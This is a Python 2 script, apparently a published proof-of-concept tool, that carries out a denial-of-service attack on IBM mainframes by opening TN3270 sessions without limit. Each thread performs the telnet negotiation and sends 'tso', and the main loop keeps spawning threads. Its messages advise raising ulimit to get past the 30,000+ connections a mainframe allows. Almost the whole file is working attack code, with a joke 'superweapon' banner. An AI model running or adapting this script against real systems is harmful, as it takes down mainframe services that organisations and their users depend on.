#!/usr/bin/env python

##################################################################
# Script to connect to all available 3270 connections		 #
#                                                                #
# Requirements: Python (lol!) 			                 #
# Created by: Soldier of Fortran (@mainframed767)                #
# Usage: For a hostname[:port] uses up all available connections #
#                                                                #
# Copyright GPL 2013                                             #
##################################################################

import socket #needed for network connection
import time #needed for sleep
import sys
import threading 
import signal
import argparse #needed for argument parsing
import platform #needed for OS check

if platform.system() == 'Windows':
	print "No windows support cause I wanted pretty colors, sorry"
	sys.exit()

from blessings import Terminal
t = Terminal()


#start argument parser
parser = argparse.ArgumentParser(description='MF DoS - A PoC script to exhaust all TN3270 connections to a mainframe',epilog='Crash and Burn!')
parser.add_argument('-t','--target', help='target IP address/Hostname',required=True,dest='target')
parser.add_argument('-p','--port',help='target port',required=True,dest='port')
parser.add_argument('-s','--scary',help='Scary Ironic ASCII to impress your boss',default=False,dest='scary',action='store_true')
#parser.add_argument('-v','--verbose',help='Be verbose',default=False,dest='verbose',action='store_true')

args = parser.parse_args()
results = parser.parse_args() # put the arg results in the variable results

port = int(results.port)
target = results.target

print t.clear

print ""
if results.scary:
	#print scary logo mwahahahahahahahhahahhah!
	print t.white_bold + """
          .                                                      .
        .n                   .                 .                  n.
  .   .dP                  dP                   9b                 9b.    .
 4    qXb         .       dX                     Xb       .        dXp     t
dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
    `9XXXXXXXXXXXP' `9XX'   """,
	print t.bright_green + t.bold + "BYE" + t.normal,
	print t.white_bold + "  `98v8P'  ",
	print t.bright_green + t.bold + "TSO" + t.normal,
	print t.white_bold + """     `XXP' `9XXXXXXXXXXXP'
        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                        )b.  .dbo.dP'`v'`9b.odb.  .dX(
                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                     `'      9XXXXXX(   )XXXXXXP      `'
                              XXXX X.`v'.X XXXX
                              XP^X'`b   d'`X^XX
                              X. 9  `   '  P )X
                              `b  `       '  d'
                               `             '
	""" + t.normal
	print "                     ",

print t.red('Mainframe SNA Connection Exhauster')
print ""



if results.scary:
	#Begin fake connection screen for cool james bond look
	print t.white_bold + "Connecting to target", results.target,
	
	for y in xrange ( 10 ):
		print ".",
		sys.stdout.flush() 
		time.sleep(0.25)
	
	print t.white_bold + "[" + t.bright_green + "OK" + t.white_bold + "]" + t.normal
	
	print t.white_bold + "Charging TSO Superweapon ",
	
	for y in xrange ( 13 ):
		print ".",
		sys.stdout.flush() 
		time.sleep(0.25)
	
	print t.white_bold + "[" + t.bright_green + "OK" + t.white_bold + "]" + t.normal
	
print t.bold_green + "===> Sessions Killed -- [          ] --",
sys.stdout.flush() 
	
#Catch CTRL-C gracefully#######
def signal_handler(signal, frame):
	print t.bright_red + 'DONE!' + t.normal
	sys.exit(0)
signal.signal(signal.SIGINT, signal_handler)
###############################

print ""

connections = 0
Down = 0
limit_reached = 0



class PurePwnge ( threading.Thread ):

   def run ( self ):

	global target
	global port
	global Down
	global limit_reached
	
	try:
		pure_evil = socket.socket()	
		pure_evil.connect((results.target,port))
		s = '\xff\xfb\x18' #Send "Will Terminal Type"
		reply = pure_evil.recv(4096)
		pure_evil.send(s)
		reply = pure_evil.recv(4096)
		#print reply.encode("hex")
		s = '\xff\xfa\x18\x00\x49\x42\x4d\x2d\x33\x32\x37\x39\x2d\x32\x2d\x45\xff\xf0' #send terminal type IBM-3279-2-E
		pure_evil.send(s)
		reply = pure_evil.recv(4096)
		s = '\xff\xfb\x19\xff\xfd\x19' #send will end of record
		pure_evil.send(s)
		reply = pure_evil.recv(4096)
		s = '\xff\xfb\x00\xff\xfd\x00' #Do binary transmission
		pure_evil.send(s)
		reply = pure_evil.recv(4096)
		#print reply.encode("hex")
		s = '\x7d\xd9\xd8\x11\xd9\xd5\xa3\xa2\x96\xff\xef' #send 'tso' to screen
		pure_evil.send(s)
	except socket.timeout:
		if Down < 2:
			Down = Down + 1
	except IOError:
		if limit_reached < 2:
			limit_reached = limit_reached + 1
###############################
# Begin Actual Attack
###############################
while True:

	if Down == 1:
		print ""
		print t.move_up + t.bold_green + "Mainframe down sleeping for 30 seconds" + t.normal
		time.sleep(30)
	if limit_reached == 1:
		print ""
		print t.move_up + t.bold_green + "Maximum sessions on your system opened. If the mainframe is still up try increasing your your max connections with " + t.bold_white + "ulimit -n <number> " + t.bold_green + ". Most mainframes allow 30,000+ connections so you'll need to play with this number if the mainframe is still up" + t.normal
		time.sleep(500)
	if limit_reached <= 1:
		if limit_reached < 1:
			print t.move_up + t.move_x(26) + t.bold_blue + str(connections)
		connections = connections + 1
		lol = PurePwnge()
		lol.daemon=True
		try:
			lol.start()
		except:
			pass
